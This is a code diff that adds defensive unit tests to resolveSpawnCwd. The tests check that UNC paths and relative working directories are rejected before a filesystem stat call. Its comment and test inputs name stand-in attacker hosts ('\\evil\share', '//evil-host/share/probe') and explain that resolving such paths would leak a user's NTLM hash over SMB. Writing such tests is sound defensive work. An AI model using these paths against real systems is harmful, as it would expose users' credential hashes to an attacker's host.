@@ -48,4 +48,28 @@ describe('resolveSpawnCwd', () => {
     expect(resolveSpawnCwd(file)).toBe(homedir());
     expect(console.warn).toHaveBeenCalled();
   });
+
+  // #804 risk #1: UNC paths must be rejected BEFORE statSync — otherwise
+  // statSync('\\\\evil\\share') triggers an SMB handshake that leaks the
+  // user's NTLM hash to the named host.
+  it('rejects UNC cwd (backslash) without statSync, falls back to homedir', () => {
+    expect(resolveSpawnCwd('\\\\evil-host\\share\\probe')).toBe(homedir());
+    expect(console.warn).toHaveBeenCalledWith(
+      expect.stringContaining('rejected by isSafePath'),
+    );
+  });
+
+  it('rejects UNC cwd (forward slash) without statSync', () => {
+    expect(resolveSpawnCwd('//evil-host/share/probe')).toBe(homedir());
+    expect(console.warn).toHaveBeenCalledWith(
+      expect.stringContaining('rejected by isSafePath'),
+    );
+  });
+
+  it('rejects relative cwd without statSync', () => {
+    expect(resolveSpawnCwd('relative/path')).toBe(homedir());
+    expect(console.warn).toHaveBeenCalledWith(
+      expect.stringContaining('rejected by isSafePath'),
+    );
+  });
 });
